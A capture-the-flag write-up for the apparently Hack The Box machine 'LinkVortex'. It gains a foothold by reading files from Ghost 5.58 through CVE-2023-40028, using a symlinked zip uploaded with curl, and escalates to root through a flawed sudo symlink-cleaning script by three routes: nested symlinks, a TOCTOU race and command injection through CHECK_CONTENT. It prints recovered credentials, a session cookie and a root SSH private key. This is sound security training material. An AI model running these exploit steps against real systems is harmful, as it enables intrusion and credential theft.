### Summary
We start the box with a webserver with subdomain resolution which we fuzz to discover two subdomains, `dev.linkvortex.htb` and `linkvortex.htb`. We notice on `linkvortex.htb`, the only user we see is `admin`. There's also a login page for `Ghost`. `dev.link.vortex` is empty but contains a git repo which we can dump and analyze, finding potential credentials which we adjust the username of to gain auth into `Ghost`. We enumerate vulnerabilities to find an Arbitrary File Read, allowing us access to a configuration file with credentials for `bob`. We can `SSH` in with these credentials and find we can run passwordless `sudo` on a bash script with at least 3 avenues of exploitation:
- It only unfurls a single layer of symbolic links, allowing us to matrioska the symlinks to gain arbitrary file read
- We can perform a Time-of-Check to Time-of-Use exploit to gain arbitrary file read
	- With arbitrary file read, we can leak the `root` user's ssh key in `/root/.ssh/id_rsa`
- We can exploit a variable being called in the script to directly invoke a root shell

### Tools
- `ffuf`
- `feroxbuster`
- `git-dumper`
- `git`
- `curl`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Bruteforce]]
	- [[#nmap HTTP scans]]
- [[#HTTP - TCP 80]]
	- [[#linkvortex.htb]]
	- [[#dev.linkvortex.htb]]
###### [[#User Shell]]
- [[#CVE-2023-40028]]
	- [[#POC]]
###### [[#User Shell - bob]]
- [[#Arbitrary File Read config.production.json]]
- [[#bob Enumeration]]
	- [[#clean_symlink.sh]]
###### [[#Root Shell]]
- [[#Double Symlinks]]
- [[#Time-of-Check to Time-of-Use (TOCTOU)]]
- [[#Exploit $CHECK_CONTENT]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.231.194 -oN nmap/tcp
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,80 -sCV -vv 10.129.231.194 -oN nmap/tcpScripts
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The TTL corresponds with a POSIX adherent system
- Given the OpenSSH version, we're likely working with `Ubuntu 22.04`
- We'll have to do some subdomain brute-forcing as the webserver tried to redirect to `linkvortex.htb`

### Subdomain Bruteforce
```sh
❯ ffuf -u "http://10.129.231.194" -H "Host: FUZZ.linkvortex.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -ac

dev             [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 38ms]
```
- We'll add both `linkvortex.htb` and `dev.linkvortex.htb` to our `/etc/hosts` file

### nmap HTTP scans
- After adding the correct domains to our hosts file, it's a good idea to perform another `nmap -sCV` scan:
```sh
❯ sudo nmap -p 80 -sCV linkvortex.htb dev.linkvortex.htb
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-generator: Ghost 5.58
|_http-title: BitByBit Hardware
|_http-server-header: Apache

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
|_http-title: Launching Soon
|_http-server-header: Apache
| http-git: 
|   10.129.231.194:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/TryGhost/Ghost.git
```
- Looks like `linkvortex.htb` is running `Ghost 5.58` and has some potential directories to search through in `robots.txt`
- `dev.linkvortex.htb` has a git repo that we can scrape through

## HTTP - TCP 80
---
### linkvortex.htb
- Navigating to `http://linkvortex.htb` brings us to a webpage for BitByBit hardware, powered by `Ghost`, a blogging framework
- There's an `About` page with nothing interesting and a `Signup` link that doesn't seem to work
- There's a search function, allowing us to search users and blogposts. The only discernable user is `admin`
- We can run `feroxbuster` on the website to see if there's anything interesting, but it accepts wildcard directories which explodes and gets ugly quick

- Navigating to the `/ghost` subdirectory from `robots.txt`, we're redirected to `http://linkvortex.htb/ghost/#/signin` where we see a sign in page
	- I'll wait to come back here when I have credentials

### dev.linkvortex.htb
- Navigating to `http://dev.linkvortex.htb` brings us to a barebones site that displays some javascript stating the website is launching soon
- We can run `feroxbuster` on the website but it doesn't give us anything interesting
- Given that we've discovered a git repo via `nmap`, we can use `git-dumper` to grab its contents:
```sh
❯ git-dumper http://dev.linkvortex.htb repo 
```

- There's nothing obviously interesting here except for `Dockerfile.ghost`
- We can check to see what's going on with `git status`:
```sh
❯ git status                        
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   Dockerfile.ghost
        modified:   ghost/core/test/regression/api/admin/authentication.test.js
```

- We can inspect what was modified with `git diff --cached`:
```diff
diff --git a/Dockerfile.ghost b/Dockerfile.ghost
new file mode 100644
index 0000000..50864e0
--- /dev/null
+++ b/Dockerfile.ghost
@@ -0,0 +1,16 @@
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]

diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {
 
         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
 
             const requestMock = nock('https://api.github.com')
                 .get('/repos/tryghost/dawn/zipball')

```
- Cool, looks like we've got some potential credentials for the `Ghost` login endpoint
- We give it a try but it doesn't grant us access, we get the error `There is no user with that email address.`
- If we modify the email address to `admin@linkvortex.htb` then it works!

# User Shell
## CVE-2023-40028
---
- We can peruse the Ghost github repo securities tab for vulnerabilities in version `5.58` (ascertained from git Dockerfile) and we [find one](https://github.com/TryGhost/Ghost/security/advisories/GHSA-9c9v-w225-v5rg) that allows for arbitrary file read
- The security posting stated that the fix was in patch `v5.59.1` which we can find [here](https://github.com/TryGhost/Ghost/commit/6a721d4dab69d4489e0cf468ea38626925e853c0)
```js
    it('Can not import a ZIP-file with symlinks', async function () {
        await request.post(localUtils.API.getApiQuery('db/'))
            .set('Origin', config.get('url'))
            .set('Accept', 'application/json')
            .expect('Content-Type', /json/)
            .attach('importfile', path.join(__dirname, '/../../../utils/fixtures/import/symlinks.zip'))
            .expect(415);
    });
```
- A file is referenced, `symlinks.zip` which we can also grab and inspect:
```sh
❯ unzip symlinks.zip   
Archive:  symlinks.zip
    linking: content/images/malicious.jpg  -> / 
finishing deferred symbolic links:
  content/images/malicious.jpg -> /
❯ ls -lah content/images/malicious.jpg 
lrwxrwxrwx. 1 aldamd aldamd 1 Feb 11 01:34 content/images/malicious.jpg -> /
```
- Looks like a zipfile with a symbolic link pointing to the root directory
- The [Ghost Admin Docs](https://docs.ghost.org/admin-api) shows that the base admin api is `https://{admin_domain}/ghost/api/admin/`, meaning we'll want to send this post request to `http://linkvortex.htb/ghost/api/admin/db/`
- We'll also need to be authenticated. We can grab the admin session cookie from the browser:
	- `ghost-admin-api-session=s%3AYrvsTPwaWwaPjs0poTXgIgRY0k8foT80.C63w6bKPyTslveRbjZW6u79JEz1rIX5JVGY%2FjGN1214`

- Essentially, the exploit creates a zipfile with a symbolically linked file that we want to read and uploads it to the database. Then, when the image is fetched, it grabs the contents of the file that we want to read from

### POC
- We can try to get this bad boy working with `curl`
- First we need to create a symlink to a test file, we'll go with `/etc/passwd`
```sh
❯ ln -s /etc/passwd content/images/malicious.jpg        
❯ ls -lah $_                                    
lrwxrwxrwx. 1 aldamd aldamd 11 Feb 11 01:40 content/images/malicious.jpg -> /etc/passwd
```
- Then we can zip it up while maintaining symbolic links:
```sh
❯ zip -y -r symlinks.zip content
```
- Now we need to send it via `curl`:
```sh
❯ curl http://linkvortex.htb/ghost/api/admin/db/ -b 'ghost-admin-api-session=s%3AYrvsTPwaWwaPjs0poTXgIgRY0k8foT80.C63w6bKPyTslveRbjZW6u79JEz1rIX5JVGY%2FjGN1214' -F 'importfile=@symlinks.zip'
{"db":[],"problems":[]}
```
- `-b` - pass cookie
- `-F` - POST file

- We can verify it worked with the following `curl` request
```sh
❯ curl http://linkvortex.htb/content/images/malicious.jpg -b 'ghost-admin-api-session=s%3AYrvsTPwaWwaPjs0poTXgIgRY0k8foT80.C63w6bKPyTslveRbjZW6u79JEz1rIX5JVGY%2FjGN1214'   
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

# User Shell - bob
## Arbitrary File Read config.production.json
---
- We want to read the contents of the config file shown in the Dockerfile, `/var/lib/ghost/config.production.json`
- We can modify the [[#POC]] above to include that file
```sh
❯ ln -s /var/lib/ghost/config.production.json content/images/malicious.png

❯ curl http://linkvortex.htb/ghost/api/admin/db/ -b 'ghost-admin-api-session=s%3AYrvsTPwaWwaPjs0poTXgIgRY0k8foT80.C63w6bKPyTslveRbjZW6u79JEz1rIX5JVGY%2FjGN1214' -F 'importfile=@symlinks.zip'
{"db":[],"problems":[]}

❯ curl http://linkvortex.htb/content/images/malicious.png -b 'ghost-admin-api-session=s%3AYrvsTPwaWwaPjs0poTXgIgRY0k8foT80.C63w6bKPyTslveRbjZW6u79JEz1rIX5JVGY%2FjGN1214'
```
```json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```
- We've got potential creds: `bob` / `fibber-talented-worth`
- `bob` isn't a user in `/etc/passwd` though, but `nxc` proves that it works
```sh
❯ nxc ssh 10.129.231.194 -u bob -p fibber-talented-worth
SSH         10.129.231.194  22     10.129.231.194   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
SSH         10.129.231.194  22     10.129.231.194   [+] bob:fibber-talented-worth  Linux - Shell access
```

## bob Enumeration
---
- We can grab `user.txt`
```sh
bob@linkvortex:~$ cat user.txt 
377c6971a77d278778ac0c8a446b3f0c
```

- `bob` is the only user with a home directory
- We run `sudo -l` to see that `bob` can run `bash` as sudo, as long as we execute `/opt/ghost/clean_symlink.sh`
```sh
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

### clean_symlink.sh
```sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
- The script first checks for a variable `CHECK_CONTENT` and sets it to `false` if it hasn't been set to `true`
- It also checks if the first input variable ends with `.png`
- Then it dereferences (a single time) the file in case it's a symbolic link
- It checks if the target contains `etc` or `root` and quits if so
- Otherwise, it moves the target to a quarantined directory and then reads the file contents

- There are at least 3 ways to exploit this script
	- Double Symlinks
	- Time-of-Check to Time-of-Use (TOCTOU)
	- Exploit $CHECK_CONTENT

# Root Shell
## Double Symlinks
---
- The symlink is only dereferenced once, meaning we can have a matrioska doll of symlinks and our file will be read
- Firstly, we need to check the [Protected Symlinks](https://dfir.ch/posts/today_i_learned_protected_symlinks/) system protection
```sh
bob@linkvortex:~$ sysctl fs.protected_symlinks
fs.protected_symlinks = 1
```
- This means symlinks are permitted to be followed only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner
- This protecting was developed specifically to address Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities, but also bites us here if we're not careful. We need to avoid putting symlinks that we want to follow in `/tmp`, `/var/tmp`, or `/dev/shm`, etc:
```sh
bob@linkvortex:~$ find / -type d -perm -0002 -perm -1000 2>/dev/null
/tmp
/tmp/.XIM-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.font-unix
/tmp/.Test-unix
/dev/mqueue
/dev/shm
/run/lock
/var/crash
/var/tmp
```

- Now we need only nest a symbolic link within another:
```sh
bob@linkvortex:~$ ln -s /root/root.txt /home/bob/b
bob@linkvortex:~$ ls -lah $_
lrwxrwxrwx 1 bob bob 14 Feb 11 05:05 /home/bob/b -> /root/root.txt

bob@linkvortex:~$ ln -s /home/bob/b /home/bob/a.png
bob@linkvortex:~$ ls -lah $_
lrwxrwxrwx 1 bob bob 11 Feb 11 05:05 /home/bob/a.png -> /home/bob/b

bob@linkvortex:~$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ a.png ] , moving it to quarantine
Content:
3c0669c40bb340b0d3255e5a4b677244
```

## Time-of-Check to Time-of-Use (TOCTOU)
---
- The intended way to solve this challenge is to exploit a TOCTOU vulnerability
- If we can run a command between the migration to the quarantine directory and the checking of the file, we can change the quarantined file
- We can have an infinite loop looking for the file we want in the quarantined directory and overwhelm it with overwrites 
```sh
bob@linkvortex:~$ while true; do ln -sf /root/root.txt /var/quarantined/toctou.png; done &
```
- `-f` will force an overwrite

```sh
bob@linkvortex:~$ ln -s /home/bob/.bashrc toctou.png
bob@linkvortex:~$ ls -lah $_
lrwxrwxrwx 1 bob bob 17 Feb 11 05:18 toctou.png -> /home/bob/.bashrc

bob@linkvortex:~$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ toctou.png ] , moving it to quarantine
Content:
30d5dc889351f670f32b891d5ae6d7ef
```

- From here, with this arbitrary file read, we can get a `root` shell by reading the contents at `/root/.ssh/id_rsa`:
```sh
bob@linkvortex:~$ ln -s /home/bob/.bashrc key.png
bob@linkvortex:~$ while true; do ln -sf /root/.ssh/id_rsa /var/quarantined/key.png; done &
[1] 27947

bob@linkvortex:~$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ key.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```sh
❯ chmod 600 id_rsa            
❯ ssh -i id_rsa root@10.129.20.96
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
root@linkvortex:~# 
```

## Exploit $CHECK_CONTENT
---
```sh
if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi
```
- At this point in the script, the author is expecting the value of `$CHECK_CONTENT` to be either `false` or `true`
- However, `false` and `true` are just commands that return `1` and `0` respectively:
```sh
bob@linkvortex:~$ false; echo $?
1
bob@linkvortex:~$ true; echo $?
0
bob@linkvortex:~$ id; echo $?
uid=1001(bob) gid=1001(bob) groups=1001(bob)
0
```
- There's no reason we can't pass other commands in:
```sh
bob@linkvortex:~$ CHECK_CONTENT=id sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ a.png ] , moving it to quarantine
uid=0(root) gid=0(root) groups=0(root)
Content:

bob@linkvortex:~$ CHECK_CONTENT=bash sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ a.png ] , moving it to quarantine
root@linkvortex:/home/bob# whoami
root
```

